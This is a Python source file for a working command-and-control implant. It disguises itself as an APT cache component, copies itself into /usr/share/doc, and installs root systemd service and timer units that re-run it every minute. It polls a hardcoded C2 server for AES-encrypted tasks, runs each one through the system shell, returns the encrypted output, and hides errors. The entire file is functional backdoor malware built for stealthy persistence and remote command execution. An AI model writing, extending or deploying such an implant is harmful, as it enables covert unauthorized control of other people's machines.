import requests
import subprocess
import shutil
import sys
import os
from pathlib import Path
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
import base64

# The address of the C2 Server
# Testing locally for now
SERVER_URL = "http://10.10.10.86:5000"
AGENT_ID = "agent_001"

# This MUST be exactly 16, 24, or 32 bytes long
SECRET_KEY = b'SixteenByteKey!!' 

def encrypt_msg(plaintext):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return base64.b64encode(cipher.iv + ct_bytes).decode('utf-8')

def decrypt_msg(encoded_ciphertext):
    raw = base64.b64decode(encoded_ciphertext)
    iv = raw[:16]
    ciphertext = raw[16:]
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ciphertext), AES.block_size).decode('utf-8')

def install_persistence():
    # 1. Configuration - Choosing a "Boring" Name
    APP_NAME = "apt-common-cache"
    # Stash path: hiding among documentation
    STASH_DIR = "/usr/share/doc/apt-common"
    STASH_PATH = os.path.join(STASH_DIR, APP_NAME)
    
    SYSTEMD_DIR = "/etc/systemd/system"
    SERVICE_PATH = os.path.join(SYSTEMD_DIR, f"{APP_NAME}.service")
    TIMER_PATH = os.path.join(SYSTEMD_DIR, f"{APP_NAME}.timer")

    # 2. Self-Migration
    # If we aren't running from the stash path, copy ourselves there
    current_exe = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
    
    try:
        if not os.path.exists(STASH_DIR):
            os.makedirs(STASH_DIR, exist_ok=True)
        
        if current_exe != STASH_PATH:
            shutil.copy2(current_exe, STASH_PATH)
            os.chmod(STASH_PATH, 0o755)
    except PermissionError:
        return

    # 3. System-Wide Service Content (Runs as Root)
    service_content = f"""[Unit]
Description=APT Common Cache Manager
After=network.target

[Service]
ExecStart={STASH_PATH}
Type=oneshot
User=root
"""

    timer_content = f"""[Unit]
Description=Trigger APT Common Cache every minute

[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
RandomizedDelaySec=5

[Install]
WantedBy=timers.target
"""

    # 4. Write the system files
    with open(SERVICE_PATH, "w") as f:
        f.write(service_content)
            
    with open(TIMER_PATH, "w") as f:
        f.write(timer_content)

    # 5. Load and Start (System-level, no --user flag)
    subprocess.run(["systemctl", "daemon-reload"], check=True)
    subprocess.run(["systemctl", "enable", f"{APP_NAME}.timer"], check=True)
    subprocess.run(["systemctl", "start", f"{APP_NAME}.timer"], check=True)

def check_in():
    try:
        # 1. Ask for a task
        response = requests.get(f"{SERVER_URL}/get_task/{AGENT_ID}")
        encrypted_task = response.json().get("task")

        task = decrypt_msg(encrypted_task)

        # 2. If the task is nop, do nothing
        if task == "nop":
            return

        # 3. Execute the task using the system shell
        print(f"[*] Executing task: {task}")
        process = subprocess.Popen(task, shell=True, 
                                   stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE, 
                                   text=True)
        stdout, stderr = process.communicate()
        
        # Combine output and errors to send back
        result = stdout + stderr

        # 4. Send the result back to the server
        encrypted_result = encrypt_msg(result)
        requests.post(f"{SERVER_URL}/post_result/{AGENT_ID}", json={"result": encrypted_result})
        
    # 5. Fail silently if there's an error
    except Exception as e:
        pass

if __name__ == "__main__":
    # 1. Define the "Official" location we decided on
    APP_NAME = "apt-common-cache"
    STASH_PATH = f"/usr/share/doc/apt-common/{APP_NAME}"
    SYSTEM_SERVICE_CHECK = f"/etc/systemd/system/{APP_NAME}.timer"

    # 2. Check if we are already installed and running from the right place
    # We check for the timer file because that is the heart of the persistence
    is_installed = os.path.exists(SYSTEM_SERVICE_CHECK)
    
    # Check if the current running executable is the one in /usr/share/doc
    # (sys.executable handles the Nuitka binary path)
    current_exe = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
    is_running_from_stash = (current_exe == STASH_PATH)

    # 3. Decision Logic
    if not is_installed or not is_running_from_stash:
        # If we aren't installed OR we are running from a temporary 
        # location (like /tmp after a curl download), run the installer.
        try:
            install_persistence()
        except Exception as e:
            # If we fail (e.g., no sudo), we still want to check_in once 
            # so the operator knows we arrived, even if we can't stay.
            pass
    check_in()